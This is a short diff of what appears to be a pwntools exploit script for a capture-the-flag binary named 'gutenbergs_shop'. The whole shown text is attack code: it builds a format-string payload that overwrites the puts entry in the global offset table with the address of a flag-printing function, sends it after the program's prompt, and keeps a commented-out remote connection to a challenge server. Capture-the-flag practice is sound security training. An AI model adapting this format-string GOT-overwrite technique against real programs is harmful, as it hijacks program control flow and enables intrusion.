@@ -12,11 +12,11 @@ p = gdb.debug('./gutenbergs_shop', '''
 
 # p = remote('52.8.15.62', 8005)
 
+# overwrite puts@got with usable flag function address
 PUTS_GOT = 0x601018
-FLAG = 0x4006a4
+FLAG_USABLE = 0x4006a4
 context.bits = 64
-payload = fmtstr_payload(6, {PUTS_GOT: FLAG})
-p.sendlineafter(b'Welcome to Ye Olde Printing Hous! Pray tell what you wish to have printed', payload)
+p.sendlineafter(b'Welcome to Ye Olde Printing Hous! Pray tell what you wish to have printed', fmtstr_payload(6, {PUTS_GOT: FLAG_USABLE}))
 
 p.interactive()
 
